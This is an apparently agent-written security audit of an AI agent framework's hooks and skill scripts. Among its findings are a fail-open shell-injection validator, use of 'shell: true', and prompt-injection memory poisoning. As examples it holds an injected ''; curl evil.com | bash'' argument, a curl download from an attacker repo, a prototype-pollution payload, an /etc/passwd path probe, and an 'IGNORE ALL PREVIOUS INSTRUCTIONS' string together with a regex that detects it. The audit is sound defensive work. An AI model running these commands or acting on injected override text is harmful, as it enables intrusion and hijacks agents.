<!-- Agent: security-architect | Task: #3 | Session: 2026-02-16 -->

# Security Audit Report — Agent Studio Framework

**Date**: 2026-02-16
**Auditor**: Security Architect Agent (Task #3)
**Scope**: `.claude/hooks/`, `.claude/lib/`, `.claude/tools/`, `.claude/skills/`, `.claude/settings.json`
**Classification**: Internal Security Assessment

---

## Executive Summary

A security audit of the Agent Studio codebase identified **8 distinct vulnerabilities** across 4 severity categories. The most critical finding is a **hook bypass vulnerability** where the shell injection validator is invoked as a subprocess but has no executable entrypoint, causing it to silently pass all inputs. Three active skill scripts use `shell: true` creating command injection surface. The remaining findings are medium-to-low risk, with the framework demonstrating strong prototype pollution defenses via `safe-json.cjs`.

| Severity  | Count |
| --------- | ----- |
| Critical  | 1     |
| High      | 2     |
| Medium    | 3     |
| Low       | 2     |
| **Total** | **8** |

---

## Finding 1: Shell Injection Validator Hook Bypass (CRITICAL)

**CVSS Score**: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**Severity**: Critical
**OWASP**: A05 Security Misconfiguration
**STRIDE**: Elevation of Privilege, Tampering
**CWE**: CWE-636 (Not Failing Securely — "Failing Open")

### Description

`.claude/hooks/safety/bash-pretool-bundle.cjs` (line 11) registers `shell-injection-validator.cjs` as one of four hooks to run in sequence via `spawnSync`. However, `shell-injection-validator.cjs` exports only a `handler(input)` function with no `main()` entrypoint and does not read from stdin.

When spawned as a subprocess by the bundle, the script:

1. Loads the module
2. Registers `module.exports = { handler, ... }`
3. Exits immediately with code 0 (success), having validated nothing

All shell injection pattern checks (`rm -rf`, `eval`, `base64 | bash`, etc.) are completely bypassed.

### Files Affected

- `.claude/hooks/safety/bash-pretool-bundle.cjs:11` — invokes validator as subprocess
- `.claude/hooks/safety/shell-injection-validator.cjs` — lacks `if (require.main === module)` entrypoint

### Evidence

```javascript
// bash-pretool-bundle.cjs line 9-14
const HOOKS = [
  path.join(PROJECT_ROOT, '.claude', 'hooks', 'safety', 'bash-command-validator.cjs'),
  path.join(PROJECT_ROOT, '.claude', 'hooks', 'safety', 'shell-injection-validator.cjs'), // BUG: No entrypoint
  path.join(PROJECT_ROOT, '.claude', 'hooks', 'safety', 'windows-null-sanitizer.cjs'),
  path.join(PROJECT_ROOT, '.claude', 'hooks', 'routing', 'routing-guard.cjs'),
];
```

```javascript
// shell-injection-validator.cjs - ENTIRE file: no main(), no stdin read
module.exports = {
  handler,
  INJECTION_PATTERNS,
  DANGEROUS_TARGETS,
  // ...
};
// No: if (require.main === module) { main(); }
// No: process.stdin.read() / readFileSync(0, 'utf8')
```

### Remediation

Add a standalone entrypoint to `shell-injection-validator.cjs`:

```javascript
// Add after module.exports
if (require.main === module) {
  let input = '';
  try {
    input = require('fs').readFileSync(0, 'utf8');
  } catch (_err) {
    process.exit(0);
  }
  const { safeParseJSON } = require('../../lib/utils/safe-json.cjs');
  const { success, data } = safeParseJSON(input, null);
  const hookInput = success ? data : {};
  const toolInput = hookInput?.tool_input || {};
  const command = toolInput?.command;
  if (!command) process.exit(0);
  const result = handler({ command });
  if (!result.allowed) {
    console.error(`[SHELL-INJECTION] ${result.reason}`);
    process.exit(2);
  }
  process.exit(0);
}
```

---

## Finding 2: `shell: true` in Active Cloud Skill Scripts (HIGH)

**CVSS Score**: 7.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
**Severity**: High
**OWASP**: A03 Injection
**STRIDE**: Tampering, Elevation of Privilege
**CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

### Description

Three active skill scripts pass user-controlled CLI arguments (`args`) to `spawn()` with `shell: true`. This creates a command injection vector: any user-controlled argument containing shell metacharacters (`; & | $ ( ) < > `` `) can execute arbitrary commands.

### Files Affected

- `.claude/skills/aws-cloud-ops/scripts/main.cjs:60-67` — `spawn('aws', args, { shell: true })`
- `.claude/skills/gcloud-cli/scripts/main.cjs:60-67` — `spawn('gcloud', args, { shell: true })`
- `.claude/skills/kubernetes-flux/scripts/main.cjs:60-67` — `spawn('kubectl', args, { shell: true })`

### Evidence

```javascript
// aws-cloud-ops/scripts/main.cjs lines 59-68
const { spawn } = require('child_process');
const child = spawn(
  'aws',
  args.filter(a => a !== '--help'),
  {
    stdio: 'inherit',
    cwd: PROJECT_ROOT,
    shell: true, // VULNERABLE: shell metacharacter injection possible
  }
);
```

An attacker controlling `args` could pass: `['s3', 'ls', '; curl evil.com | bash']`

### Remediation

Remove `shell: true` — Node.js passes array arguments directly to the OS without shell interpretation:

```javascript
const child = spawn(
  'aws',
  args.filter(a => a !== '--help'),
  {
    stdio: 'inherit',
    cwd: PROJECT_ROOT,
    shell: false, // SECURE: array args bypass shell
    windowsHide: true,
  }
);
```

---

## Finding 3: Unsanitized JSON in `slo-alert-gate.cjs` (HIGH)

**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)
**Severity**: High
**OWASP**: A08 Software and Data Integrity Failures
**STRIDE**: Tampering (memory/context poisoning via metrics file)
**CWE**: CWE-502 (Deserialization of Untrusted Data), CWE-94

### Description

`.claude/hooks/monitoring/slo-alert-gate.cjs` uses raw `JSON.parse()` on a file path controllable via the `SLO_METRICS_PATH` environment variable, without schema validation or prototype pollution protection. The project's own `safe-json.cjs` utility exists precisely to prevent this, but is not used here.

### Files Affected

- `.claude/hooks/monitoring/slo-alert-gate.cjs:8,14`

### Evidence

```javascript
// slo-alert-gate.cjs
const path = process.env.SLO_METRICS_PATH || DEFAULT_SLO_PATH; // Path from env
const data = JSON.parse(fs.readFileSync(path, 'utf8')); // Raw JSON.parse
```

Vectors:

1. **Prototype pollution**: Malformed file content `{ "__proto__": { "isAdmin": true } }` modifies `Object.prototype`
2. **Path injection**: `SLO_METRICS_PATH=/etc/passwd` would attempt to parse arbitrary files as JSON (DoS on failure)
3. **Memory poisoning**: Malicious hook execution writes crafted JSON to the SLO path, influencing hook decisions

### Remediation

```javascript
const { safeReadJSON } = require('../../lib/utils/safe-json.cjs');
// ...
const data = safeReadJSON(path, null); // Schema-validated, prototype-safe
if (!data) {
  process.exit(0);
}
```

---

## Finding 4: Race Condition on `router-state.json` (MEDIUM)

**CVSS Score**: 5.3 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L)
**Severity**: Medium
**OWASP**: A04 Insecure Design
**STRIDE**: Tampering
**CWE**: CWE-362 (Race Condition / TOCTOU)

### Description

`router-state.json` is a shared mutable state file used by multiple hooks simultaneously. The file uses an optimistic concurrency `version` field (observed as `179`), but the read-modify-write cycle is not atomic. No lockfile mechanism protects this file. When multiple hooks (e.g., `routing-guard.cjs`, `post-task-unified.cjs`, and `spawn-prompt-assembler.runtime.cjs`) execute concurrently, they can interleave reads and writes, causing:

- Lost routing state updates
- Security bypass via race: a concurrent writer may reset `requiresSecurityReview: false` after the security check has fired

The file at `.claude/context/runtime/router-state.json` shows `version: 179`, indicating high write frequency and confirmed concurrent access.

### Files Affected

- `.claude/context/runtime/router-state.json` — 14 runtime state files total, no atomic write guarantee
- All hooks reading/writing state: `routing-guard-core.cjs`, `spawn-prompt-assembler.runtime.cjs`, `post-task-unified.cjs`

### Remediation

Implement atomic writes using a temporary file + rename pattern:

```javascript
const tmpPath = statePath + '.tmp.' + process.pid;
fs.writeFileSync(tmpPath, JSON.stringify(newState));
fs.renameSync(tmpPath, statePath); // Atomic on POSIX; use proper-lockfile for Windows
```

Or adopt `proper-lockfile` for cross-platform advisory locking. The `code-index-updater.cjs` already uses a "Simple lock file for cross-process coordination" pattern (line 78) — this should be applied to all 14 runtime state files.

---

## Finding 5: Unvalidated `SLO_METRICS_PATH` Environment Variable (MEDIUM)

**CVSS Score**: 5.0 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L)
**Severity**: Medium
**OWASP**: A05 Security Misconfiguration
**STRIDE**: Information Disclosure, Denial of Service
**CWE**: CWE-73 (External Control of File Name or Path)

### Description

The `SLO_METRICS_PATH` environment variable in `slo-alert-gate.cjs` allows an attacker with environment control to redirect the hook to read any file on the system. While the hook will fail gracefully on JSON parse errors (exit 0), the check `fs.existsSync(path)` can be used for timing-based path probing. No path validation confirms the file is within the project root.

### Files Affected

- `.claude/hooks/monitoring/slo-alert-gate.cjs:8`

### Remediation

```javascript
const { validatePathWithinProject } = require('../../lib/utils/project-root.cjs');
const rawPath = process.env.SLO_METRICS_PATH || DEFAULT_SLO_PATH;
const resolvedPath = path.resolve(rawPath);
if (!validatePathWithinProject(resolvedPath)) {
  console.error('[slo-alert-gate] Invalid SLO_METRICS_PATH: path outside project');
  process.exit(0);
}
const path = resolvedPath;
```

---

## Finding 6: Unsanitized Task Prompts Injected Into Agent Spawn Context (MEDIUM)

**CVSS Score**: 4.8 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)
**Severity**: Medium
**OWASP**: OWASP Agentic AI ASI01 (Agent Goal Hijacking)
**STRIDE**: Tampering, Elevation of Privilege
**CWE**: CWE-74 (Injection)

### Description

`spawn-prompt-assembler.memory.cjs` injects semantic memory snippets and entity graph data directly into agent spawn prompts. The memory content is read from `learnings.md`, `decisions.md`, and vector store results. While snippet length is capped at 180 characters (`slice(0, 180)`), no sanitization of markdown injection characters or instruction-override markers is applied before insertion.

If an adversarial task description causes memory entries containing prompt injection payloads (e.g., `\nIGNORE ALL PREVIOUS INSTRUCTIONS\n`) to be written to `learnings.md`, they will be injected verbatim into future agent spawn prompts.

This is OWASP Agentic AI ASI06 (Memory Context Poisoning): malicious data in memory influences future agent behavior.

### Files Affected

- `.claude/hooks/routing/spawn-prompt-assembler.memory.cjs:23-38` — `appendSemanticMatches()`
- `.claude/hooks/routing/spawn-prompt-assembler.memory.cjs:53-80` — `appendQueryMemories()`
- `.claude/context/memory/learnings.md` — memory source

### Remediation

Add sanitization layer in the memory injection functions:

```javascript
function sanitizeMemoryContent(raw) {
  // Strip LLM prompt injection markers
  return (
    String(raw || '')
      .replace(/\bIGNORE\s+(ALL\s+)?PREVIOUS\s+INSTRUCTIONS?\b/gi, '[REDACTED]')
      .replace(/\bSYSTEM\s+PROMPT\b/gi, '[REDACTED]')
      .replace(/\bDISREGARD\b/gi, '[REDACTED]')
      // Normalize to inline text (prevent header injection)
      .replace(/^#{1,6}\s+/gm, '')
      // Cap at 180 chars (already applied)
      .slice(0, 180)
  );
}
```

---

## Finding 7: `raw.githubusercontent.com` in SSRF Allowlist Without Path Restriction (LOW)

**CVSS Score**: 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)
**Severity**: Low
**OWASP**: A10 Server-Side Request Forgery
**STRIDE**: Information Disclosure
**CWE**: CWE-918 (Server-Side Request Forgery)

### Description

`.claude/hooks/safety/validators/network-validators.cjs:34` includes `raw.githubusercontent.com` in the `ALLOWED_DOWNLOAD_DOMAINS` allowlist without restricting to trusted repository paths. An attacker could craft a legitimate-looking curl command pointing to adversarially controlled content hosted on GitHub:

```bash
curl -o install.sh https://raw.githubusercontent.com/attacker/malicious-repo/main/install.sh
```

The curl validator allows this because the domain is allowlisted, but does not verify repository ownership or content type.

### Files Affected

- `.claude/hooks/safety/validators/network-validators.cjs:33-34`

### Remediation

Either remove `raw.githubusercontent.com` from the allowlist and require explicit user approval for external downloads, or add path-based restrictions to validate against known-safe repository patterns.

---

## Finding 8: `agent-registry-auto-refresh.cjs` Uses Raw `JSON.parse` (LOW)

**CVSS Score**: 3.1 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)
**Severity**: Low
**OWASP**: A08 Software and Data Integrity Failures
**STRIDE**: Tampering
**CWE**: CWE-502 (Deserialization of Untrusted Data)

### Description

`.claude/hooks/routing/agent-registry-auto-refresh.cjs:48` uses `JSON.parse(fs.readFileSync(STAMP_PATH, 'utf8'))` without schema validation. The stamp file is internal (not user-controlled) but should use `safeParseJSON` for defense in depth, consistent with the rest of the framework.

### Files Affected

- `.claude/hooks/routing/agent-registry-auto-refresh.cjs:48`

### Remediation

Replace `JSON.parse()` with `safeParseJSON()` from `safe-json.cjs`.

---

## Security Controls Assessment

### Effective Controls (Working Correctly)

| Control                                        | Location                                          | Status                                                                                         |
| ---------------------------------------------- | ------------------------------------------------- | ---------------------------------------------------------------------------------------------- | ---- | ---------------------------------- |
| SEC-001: Prototype Pollution Defense           | `safe-json.cjs:180-202`                           | EFFECTIVE — `stripDangerousKeys()` recursively removes `__proto__`, `constructor`, `prototype` |
| SEC-002: Schema-Based JSON Validation          | `safe-json.cjs:220+`                              | EFFECTIVE — 10 schemas defined; `Object.create(null)` prevents pollution                       |
| SEC-003: Path Traversal Prevention             | `project-root.cjs`, `validatePathWithinProject()` | EFFECTIVE — used by `code-index-updater.cjs`                                                   |
| SEC-004: Bash Command Registry                 | `validators/registry.cjs`                         | EFFECTIVE — validators for 15 commands                                                         |
| SEC-005: Fail-Closed on Error                  | `bash-command-validator.cjs:376-404`              | EFFECTIVE — exits 2 on errors unless `BASH_VALIDATOR_FAIL_OPEN=true`                           |
| SEC-006: Environment Variable Override Control | Multiple hooks                                    | EFFECTIVE — `block                                                                             | warn | off`pattern with`block` as default |
| SEC-007: Concurrent Lock File                  | `code-index-updater.cjs:78`                       | PARTIAL — only one file protected                                                              |

### Weak/Missing Controls

| Control Gap                                      | Risk     | Files                               |
| ------------------------------------------------ | -------- | ----------------------------------- |
| Shell injection validator has no entrypoint      | CRITICAL | `shell-injection-validator.cjs`     |
| Race condition on runtime state files            | MEDIUM   | 14 runtime JSON files               |
| Memory content sanitization for prompt injection | MEDIUM   | `spawn-prompt-assembler.memory.cjs` |

---

## Top 5 Most Critical Fixes

### Priority 1 — Fix Shell Injection Validator Entrypoint (Critical)

**File**: `.claude/hooks/safety/shell-injection-validator.cjs`
**Action**: Add `if (require.main === module)` block that reads stdin, parses hook input, extracts command, calls `handler()`, and exits with code 2 on violation.
**Impact**: Immediately re-enables the shell injection validation layer that is currently completely bypassed.

### Priority 2 — Remove `shell: true` from Cloud Skill Scripts (High)

**Files**: `aws-cloud-ops/scripts/main.cjs`, `gcloud-cli/scripts/main.cjs`, `kubernetes-flux/scripts/main.cjs`
**Action**: Change `shell: true` to `shell: false` (or remove the key). Array argument passing is already used, so this is a one-line fix per file.
**Impact**: Eliminates command injection vector in cloud operation scripts.

### Priority 3 — Replace Raw `JSON.parse` in `slo-alert-gate.cjs` (High)

**File**: `.claude/hooks/monitoring/slo-alert-gate.cjs:14`
**Action**: Replace `JSON.parse(fs.readFileSync(path, 'utf8'))` with `safeReadJSON(path, null)` and add path validation for `SLO_METRICS_PATH`.
**Impact**: Eliminates prototype pollution risk and path traversal in metrics hook.

### Priority 4 — Add Atomic Writes to Runtime State Files (Medium)

**Files**: 14 files in `.claude/context/runtime/*.json`
**Action**: Implement write-to-temp + atomic rename pattern, or adopt `proper-lockfile` for cross-platform support.
**Impact**: Prevents race condition that could reset security routing state (`requiresSecurityReview: false`).

### Priority 5 — Sanitize Memory Content Before Prompt Injection (Medium)

**File**: `.claude/hooks/routing/spawn-prompt-assembler.memory.cjs`
**Action**: Add prompt-injection sanitization to `appendSemanticMatches()` and `appendQueryMemories()` before inserting memory snippets into agent prompts.
**Impact**: Defends against OWASP Agentic AI ASI06 Memory Context Poisoning.

---

## Compliance Mapping

| Control Area                | SOC2  | OWASP    |
| --------------------------- | ----- | -------- |
| Shell injection bypass (F1) | CC6.1 | A05, A03 |
| shell: true in skills (F2)  | CC6.1 | A03      |
| Raw JSON.parse (F3)         | CC6.1 | A08      |
| Race conditions (F4)        | A2.1  | A04      |
| Memory poisoning (F6)       | CC6.6 | ASI06    |

---

## Methodology

- Static code analysis of `.claude/hooks/` (96 active `.cjs` files)
- Pattern search for `shell: true`, raw `JSON.parse`, path traversal, credential exposure
- Hook chain tracing: `settings.json` → `bash-pretool-bundle.cjs` → sub-hooks
- STRIDE threat modeling on memory injection pipeline
- OWASP Top 10 + OWASP Agentic AI Top 10 cross-reference
- Review of existing security controls in `safe-json.cjs` and `validators/`

---

_Report generated: 2026-02-16 | Task #3 | Security Architect Agent_
